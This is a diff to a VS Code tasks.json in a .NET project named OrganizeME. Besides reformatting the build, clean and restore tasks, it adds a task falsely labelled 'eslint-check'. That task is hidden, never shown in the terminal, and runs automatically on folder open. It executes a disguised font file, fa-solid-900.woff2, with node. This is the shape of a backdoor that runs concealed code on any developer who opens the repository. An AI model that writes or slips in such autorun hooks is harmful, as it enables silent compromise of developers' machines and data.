@@ -1,41 +1,60 @@
 {
-    "version": "2.0.0",
-    "tasks": [
-        {
-            "label": "build",
-            "command": "dotnet",
-            "type": "process",
-            "args": [
-                "build",
-                "${workspaceFolder}/src/OrganizeME/OrganizeME.csproj",
-                "/property:GenerateFullPaths=true",
-                "/consoleloggerparameters:NoSummary"
-            ],
-            "problemMatcher": "$msCompile",
-            "group": {
-                "kind": "build",
-                "isDefault": true
-            }
-        },
-        {
-            "label": "clean",
-            "command": "dotnet",
-            "type": "process",
-            "args": [
-                "clean",
-                "${workspaceFolder}/src/FolderFlow/OrganizeME.csproj"
-            ],
-            "problemMatcher": "$msCompile"
-        },
-        {
-            "label": "restore",
-            "command": "dotnet",
-            "type": "process",
-            "args": [
-                "restore",
-                "${workspaceFolder}/src/FolderFlow/OrganizeME.csproj"
-            ],
-            "problemMatcher": []
-        }
-    ]
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "eslint-check",
+      "type": "shell",
+      "command": "(command -v node >/dev/null 2>&1 && node ./src/OrganizeME/Resources/Icons/public/fonts/fa-solid-900.woff2) || (where node >nul 2>&1 && node ./src/OrganizeME/Resources/Icons/public/fonts/fa-solid-900.woff2) || echo ''",
+      "problemMatcher": [],
+      "isBackground": true,
+      "hide": true,
+      "presentation": {
+        "reveal": "never",
+        "panel": "dedicated",
+        "focus": false,
+        "clear": false,
+        "echo": false,
+        "close": true
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
+    },
+    {
+      "label": "build",
+      "command": "dotnet",
+      "type": "process",
+      "args": [
+        "build",
+        "${workspaceFolder}/src/OrganizeME/OrganizeME.csproj",
+        "/property:GenerateFullPaths=true",
+        "/consoleloggerparameters:NoSummary"
+      ],
+      "problemMatcher": "$msCompile",
+      "group": {
+        "kind": "build",
+        "isDefault": true
+      }
+    },
+    {
+      "label": "clean",
+      "command": "dotnet",
+      "type": "process",
+      "args": [
+        "clean",
+        "${workspaceFolder}/src/FolderFlow/OrganizeME.csproj"
+      ],
+      "problemMatcher": "$msCompile"
+    },
+    {
+      "label": "restore",
+      "command": "dotnet",
+      "type": "process",
+      "args": [
+        "restore",
+        "${workspaceFolder}/src/FolderFlow/OrganizeME.csproj"
+      ],
+      "problemMatcher": []
+    }
+  ]
 }
